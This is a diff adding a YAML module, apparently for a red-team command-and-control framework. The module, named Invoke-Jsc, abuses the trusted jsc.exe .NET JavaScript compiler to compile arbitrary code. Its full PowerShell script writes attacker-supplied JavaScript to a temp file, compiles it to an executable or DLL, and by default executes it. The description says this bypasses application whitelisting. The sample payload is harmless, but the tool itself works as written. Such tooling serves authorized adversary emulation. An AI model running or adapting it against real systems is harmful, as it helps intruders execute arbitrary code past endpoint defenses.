@@ -1,0 +1,118 @@
+name: Invoke-Jsc
+authors:
+  - name: Anthony Rose
+    handle: '@Cx01N'
+    link: https://twitter.com/Cx01N_
+description: |
+  Compiles JavaScript code to a Windows executable or DLL using
+  jsc.exe, a legitimate .NET Framework JavaScript compiler. This is
+  a trusted developer utility that can be abused to compile and
+  execute arbitrary code, bypassing application whitelisting controls.
+  Writes a temporary JavaScript file and invokes jsc.exe to compile
+  it.
+software: ''
+tactics: [TA0005]
+techniques: [T1127]
+background: true
+output_extension:
+needs_admin: false
+opsec_safe: false
+language: powershell
+min_language_version: '2'
+comments:
+  - https://github.com/redcanaryco/atomic-red-team
+  - https://lolbas-project.github.io/lolbas/Binaries/Jsc/
+options:
+  - name: JavaScriptCode
+    description: JavaScript source code to compile.
+    required: true
+    value: "import System; Console.WriteLine('Hello from jsc.exe compiled JavaScript');"
+  - name: OutputPath
+    description: Output path for the compiled executable.
+    required: true
+    value: '$env:TEMP\jsc_output.exe'
+  - name: OutputType
+    description: Output type (exe or library).
+    required: false
+    value: 'exe'
+    suggested_values:
+      - exe
+      - library
+  - name: JscPath
+    description: Path to jsc.exe.
+    required: true
+    value: 'C:\Windows\Microsoft.NET\Framework\v4.0.30319\jsc.exe'
+  - name: Execute
+    description: Execute the compiled output.
+    required: false
+    value: 'True'
+    strict: true
+    suggested_values:
+      - 'True'
+      - 'False'
+  - name: OutputFunction
+    description: PowerShell output function to use.
+    required: false
+    value: 'Out-String'
+    suggested_values:
+      - Out-String
+      - ConvertTo-Json
+script: |
+  function Invoke-Jsc {
+      param(
+          [string]$JavaScriptCode,
+          [string]$OutputPath,
+          [string]$OutputType = "exe",
+          [string]$JscPath,
+          [switch]$Execute
+      )
+
+      $outPath = $ExecutionContext.InvokeCommand.ExpandString($OutputPath)
+
+      if (-not (Test-Path $JscPath)) {
+          Write-Output "[-] jsc.exe not found at: $JscPath"
+          Write-Output "[*] Try checking other .NET Framework versions."
+          return
+      }
+
+      # Write JavaScript to temp file
+      $jsFile = "$env:TEMP\jsc_temp_$(Get-Random).js"
+      try {
+          [System.IO.File]::WriteAllText($jsFile, $JavaScriptCode)
+          Write-Output "[+] Wrote JavaScript to: $jsFile"
+      } catch {
+          Write-Output "[-] Failed to write temp JavaScript file: $_"
+          return
+      }
+
+      # Build jsc.exe arguments
+      $jscArgs = @()
+      if ($OutputType -eq "library") {
+          $jscArgs += "/t:library"
+      }
+      $jscArgs += "/out:`"$outPath`""
+      $jscArgs += "`"$jsFile`""
+
+      Write-Output "[*] Compiling with jsc.exe..."
+      $result = & $JscPath $jscArgs 2>&1
+      if ($LASTEXITCODE -ne 0) {
+          Write-Output "[-] jsc.exe exited with code $LASTEXITCODE"
+      }
+      Write-Output $result
+
+      if (Test-Path $outPath) {
+          Write-Output "[+] Compiled output: $outPath"
+
+          if ($Execute -and $OutputType -eq "exe") {
+              Write-Output "[*] Executing compiled output..."
+              $execResult = & $outPath 2>&1
+              Write-Output $execResult
+          }
+      } else {
+          Write-Output "[-] Compilation failed. Output not found."
+      }
+
+      # Cleanup temp JS file
+      try { Remove-Item $jsFile -Force } catch { Write-Output "[!] Warning: failed to clean up temp file $jsFile" }
+  }
+script_end: Invoke-Jsc {{ PARAMS }} | {{ OUTPUT_FUNCTION }}
